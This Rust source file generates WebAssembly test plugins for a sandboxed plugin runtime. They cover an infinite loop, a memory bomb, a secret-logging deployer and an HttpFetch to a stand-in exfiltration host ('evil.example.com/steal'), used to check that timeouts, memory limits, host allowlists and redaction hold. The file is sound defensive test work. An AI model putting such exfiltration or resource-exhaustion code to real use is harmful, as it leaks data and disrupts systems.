//! WAT sources of the ABI v1 test / fixture plugins (no wasm toolchain
//! needed). Each module exports `memory`, a bump `orkestr_alloc` and
//! `orkestr_call`; see [`crate::abi`].

/// Escapes a string for a WAT data segment.
fn esc(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

const ALLOC: &str = r#"
  (global $hp (mut i32) (i32.const 4096))
  (func $alloc (export "orkestr_alloc") (param $n i32) (result i32) (local $p i32)
    (local.set $p (global.get $hp))
    (global.set $hp (i32.add (local.get $p) (local.get $n)))
    (block $ok
      (loop $grow
        (br_if $ok (i32.le_u (global.get $hp) (i32.mul (memory.size) (i32.const 65536))))
        (if (i32.eq (memory.grow (i32.const 1)) (i32.const -1)) (then unreachable))
        (br $grow)))
    (local.get $p))
  (func $pack (param $p i32) (param $l i32) (result i64)
    (i64.or (i64.shl (i64.extend_i32_u (local.get $p)) (i64.const 32)) (i64.extend_i32_u (local.get $l))))
"#;

fn module(datas: &[(u32, &str)], body: &str) -> String {
    let data: String = datas.iter().map(|(off, s)| format!("  (data (i32.const {off}) \"{}\")\n", esc(s))).collect();
    format!(
        "(module\n  (import \"orkestr\" \"host_call\" (func $host (param i32 i32) (result i64)))\n  (memory (export \"memory\") 1)\n{data}{ALLOC}{body})\n"
    )
}

/// Host request of [`hello`]: one `Log` call.
pub const HELLO_LOG_REQUEST: &str = r#"{"op":"Log","input":{"level":"info","message":"hello called"}}"#;

/// `hello`: logs once through the host, then returns `{"ok":{"echo": <call request>}}`.
#[must_use]
pub fn hello() -> String {
    let prefix = r#"{"ok":{"echo":"#;
    let body = format!(
        r#"
  (func (export "orkestr_call") (param $ptr i32) (param $len i32) (result i64) (local $out i32) (local $total i32)
    (drop (call $host (i32.const 64) (i32.const {log_len})))
    (local.set $total (i32.add (local.get $len) (i32.const {extra})))
    (local.set $out (call $alloc (local.get $total)))
    (memory.copy (local.get $out) (i32.const 16) (i32.const {plen}))
    (memory.copy (i32.add (local.get $out) (i32.const {plen})) (local.get $ptr) (local.get $len))
    (memory.copy (i32.add (i32.add (local.get $out) (i32.const {plen})) (local.get $len)) (i32.const 40) (i32.const 2))
    (call $pack (local.get $out) (local.get $total)))
"#,
        log_len = HELLO_LOG_REQUEST.len(),
        plen = prefix.len(),
        extra = prefix.len() + 2,
    );
    module(&[(16, prefix), (40, "}}"), (64, HELLO_LOG_REQUEST)], &body)
}

/// Infinite loop (stopped by the epoch deadline, fuel or the kill switch).
#[must_use]
pub fn infinite_loop() -> String {
    module(
        &[],
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    (loop $l (br $l))
    (i64.const 0))
"#,
    )
}

/// Grows memory until the store limit traps.
#[must_use]
pub fn memory_bomb() -> String {
    module(
        &[],
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    (loop $l
      (drop (memory.grow (i32.const 16)))
      (br $l))
    (i64.const 0))
"#,
    )
}

/// Host request of [`fetch`]: an `HttpFetch` to a host no manifest grants.
pub const FETCH_REQUEST: &str = r#"{"op":"HttpFetch","input":{"url":"https://evil.example.com/steal"}}"#;

/// Calls `HttpFetch` on an undeclared host and returns the host's reply verbatim.
#[must_use]
pub fn fetch() -> String {
    let body = format!(
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    (call $host (i32.const 64) (i32.const {len})))
"#,
        len = FETCH_REQUEST.len()
    );
    module(&[(64, FETCH_REQUEST)], &body)
}

/// Lays strings out from offset 64 (below the heap at 4096).
fn layout<'a>(items: &[&'a str]) -> Vec<(u32, &'a str)> {
    let mut off = 64u32;
    items
        .iter()
        .map(|s| {
            let at = off;
            off += u32::try_from(s.len()).unwrap_or(0) + 8;
            at
        })
        .zip(items.iter().copied())
        .collect()
}

fn ret(d: &[(u32, &str)], i: usize) -> String {
    format!("(call $pack (i32.const {}) (i32.const {}))", d[i].0, d[i].1.len())
}

fn host_drop(d: &[(u32, &str)], i: usize) -> String {
    format!("(drop (call $host (i32.const {}) (i32.const {})))", d[i].0, d[i].1.len())
}

/// Event kind `hello-subscriber` subscribes to.
pub const SUBSCRIBER_KIND: &str = "TaskCreated";

/// `hello-subscriber`: `orkestr_on_event` increments the KV counter `count`
/// (`KvGet` → parse digits → `KvSet`); the tool (`orkestr_call`) returns the
/// counter (`KvGet` reply verbatim, `null` before the first event). With
/// `spin`, `orkestr_on_event` loops forever instead (queue / kill tests).
#[must_use]
pub fn subscriber(spin: bool) -> String {
    let d = layout(&[
        r#"{"op":"KvGet","input":{"key":"count"}}"#,
        r#"{"op":"KvSet","input":{"key":"count","value":"#,
        "}}",
        r#"{"ok":null}"#,
    ]);
    let on_event = if spin {
        "(loop $l (br $l)) (i64.const 0)".to_owned()
    } else {
        format!(
            r#"
    (local.set $r (call $host (i32.const {g}) (i32.const {gl})))
    (local.set $p (i32.wrap_i64 (i64.shr_u (local.get $r) (i64.const 32))))
    (local.set $l (i32.wrap_i64 (local.get $r)))
    (local.set $i (i32.const 6))
    (block $done (loop $digits
      (br_if $done (i32.ge_u (local.get $i) (local.get $l)))
      (local.set $c (i32.load8_u (i32.add (local.get $p) (local.get $i))))
      (br_if $done (i32.lt_u (local.get $c) (i32.const 48)))
      (br_if $done (i32.gt_u (local.get $c) (i32.const 57)))
      (local.set $n (i32.add (i32.mul (local.get $n) (i32.const 10)) (i32.sub (local.get $c) (i32.const 48))))
      (local.set $i (i32.add (local.get $i) (i32.const 1)))
      (br $digits)))
    (local.set $n (i32.add (local.get $n) (i32.const 1)))
    (local.set $b (i32.const 2064))
    (loop $fmt
      (local.set $b (i32.sub (local.get $b) (i32.const 1)))
      (i32.store8 (local.get $b) (i32.add (i32.const 48) (i32.rem_u (local.get $n) (i32.const 10))))
      (local.set $n (i32.div_u (local.get $n) (i32.const 10)))
      (br_if $fmt (local.get $n)))
    (local.set $dl (i32.sub (i32.const 2064) (local.get $b)))
    (local.set $t (i32.add (local.get $dl) (i32.const {fixed})))
    (local.set $o (call $alloc (local.get $t)))
    (memory.copy (local.get $o) (i32.const {s}) (i32.const {sl}))
    (memory.copy (i32.add (local.get $o) (i32.const {sl})) (local.get $b) (local.get $dl))
    (memory.copy (i32.add (i32.add (local.get $o) (i32.const {sl})) (local.get $dl)) (i32.const {e}) (i32.const {el}))
    (drop (call $host (local.get $o) (local.get $t)))
    {ok}"#,
            g = d[0].0,
            gl = d[0].1.len(),
            s = d[1].0,
            sl = d[1].1.len(),
            e = d[2].0,
            el = d[2].1.len(),
            fixed = d[1].1.len() + d[2].1.len(),
            ok = ret(&d, 3),
        )
    };
    let body = format!(
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    (call $host (i32.const {g}) (i32.const {gl})))
  (func (export "orkestr_on_event") (param i32 i32) (result i64)
    (local $r i64) (local $p i32) (local $l i32) (local $i i32) (local $c i32) (local $n i32)
    (local $b i32) (local $dl i32) (local $t i32) (local $o i32)
    {on_event})
"#,
        g = d[0].0,
        gl = d[0].1.len(),
    );
    module(&d, &body)
}

/// Vault secret `hello-deployer` reads (if granted) and logs (the deploy log redacts it).
pub const DEPLOYER_SECRET: &str = "HELLO_DEPLOY_TOKEN";
/// URL `hello-deployer` reports.
pub const DEPLOYER_URL: &str = "https://hello-deployer.example/";

/// `hello-deployer`: `orkestr_deploy` answers `availability` (Ready) and
/// `plan` (three steps); `deploy` logs three steps (plus the granted
/// `HELLO_DEPLOY_TOKEN` value when readable, to show redaction) and returns
/// [`DEPLOYER_URL`]; `rollback` logs and returns the URL. With `slow`,
/// `deploy` loops forever after its first log line (cancel tests).
#[must_use]
pub fn deployer(slow: bool) -> String {
    let d = layout(&[
        r#"{"ok":{"state":"Ready"}}"#,
        r#"{"ok":{"steps":["package the source","upload to hello-deployer.example","activate the release"],"warnings":[]}}"#,
        r#"{"ok":{"url":"https://hello-deployer.example/","providerRef":"hd-release"}}"#,
        r#"{"ok":{"url":"https://hello-deployer.example/","providerRef":"hd-rollback"}}"#,
        r#"{"op":"Log","input":{"level":"info","message":"hello-deployer: step 1/3 packaging"}}"#,
        r#"{"op":"Log","input":{"level":"info","message":"hello-deployer: step 2/3 uploading"}}"#,
        r#"{"op":"Log","input":{"level":"info","message":"hello-deployer: step 3/3 activating"}}"#,
        r#"{"op":"Log","input":{"level":"info","message":"hello-deployer: rolling back"}}"#,
        r#"{"op":"SecretGet","input":{"name":"HELLO_DEPLOY_TOKEN"}}"#,
        r#"{"op":"Log","input":{"level":"info","message":"hello-deployer: using token "#,
        r#""}}"#,
        r#"{"error":"unknown deploy op"}"#,
    ]);
    let spin = if slow { "(loop $spin (br $spin))" } else { "" };
    let body = format!(
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    {err})
  (func (export "orkestr_deploy") (param $ptr i32) (param $len i32) (result i64)
    (local $op i32) (local $r i64) (local $rp i32) (local $rl i32) (local $vl i32) (local $t i32) (local $o i32)
    (local.set $op (i32.load8_u (i32.add (local.get $ptr) (i32.const 7))))
    (if (i32.eq (local.get $op) (i32.const 97)) (then (return {avail})))
    (if (i32.eq (local.get $op) (i32.const 112)) (then (return {plan})))
    (if (i32.eq (local.get $op) (i32.const 114)) (then {log_rb} (return {rollback})))
    (if (i32.eq (local.get $op) (i32.const 100)) (then
      {log1}
      {spin}
      (local.set $r (call $host (i32.const {sg}) (i32.const {sgl})))
      (local.set $rp (i32.wrap_i64 (i64.shr_u (local.get $r) (i64.const 32))))
      (local.set $rl (i32.wrap_i64 (local.get $r)))
      (if (i32.and (i32.gt_u (local.get $rl) (i32.const 19))
                   (i32.eq (i32.load8_u (i32.add (local.get $rp) (i32.const 2))) (i32.const 111)))
        (then
          (local.set $vl (i32.sub (local.get $rl) (i32.const 19)))
          (local.set $t (i32.add (local.get $vl) (i32.const {fixed})))
          (local.set $o (call $alloc (local.get $t)))
          (memory.copy (local.get $o) (i32.const {tp}) (i32.const {tpl}))
          (memory.copy (i32.add (local.get $o) (i32.const {tpl})) (i32.add (local.get $rp) (i32.const 16)) (local.get $vl))
          (memory.copy (i32.add (i32.add (local.get $o) (i32.const {tpl})) (local.get $vl)) (i32.const {ts}) (i32.const {tsl}))
          (drop (call $host (local.get $o) (local.get $t)))))
      {log2}
      {log3}
      (return {deploy})))
    {err})
"#,
        avail = ret(&d, 0),
        plan = ret(&d, 1),
        deploy = ret(&d, 2),
        rollback = ret(&d, 3),
        log1 = host_drop(&d, 4),
        log2 = host_drop(&d, 5),
        log3 = host_drop(&d, 6),
        log_rb = host_drop(&d, 7),
        sg = d[8].0,
        sgl = d[8].1.len(),
        tp = d[9].0,
        tpl = d[9].1.len(),
        ts = d[10].0,
        tsl = d[10].1.len(),
        fixed = d[9].1.len() + d[10].1.len(),
        err = ret(&d, 11),
    );
    module(&d, &body)
}

/// Compiles WAT text to wasm bytes.
///
/// # Errors
/// Invalid WAT.
pub fn to_wasm(src: &str) -> Result<Vec<u8>, crate::PluginError> {
    wat::parse_str(src).map_err(|e| crate::PluginError::Internal(format!("wat: {e}")))
}

// Compatibility aliases used by the runtime tests.
pub(crate) const HELLO: &str = "hello";
pub(crate) const LOOP: &str = "loop";
pub(crate) const MEMORY_BOMB: &str = "bomb";
pub(crate) const FETCH: &str = "fetch";

/// Source of a fixture by short name (`hello`, `loop`, `bomb`, `fetch`).
#[must_use]
pub fn by_name(name: &str) -> Option<String> {
    match name {
        HELLO => Some(hello()),
        LOOP => Some(infinite_loop()),
        MEMORY_BOMB => Some(memory_bomb()),
        FETCH => Some(fetch()),
        _ => None,
    }
}
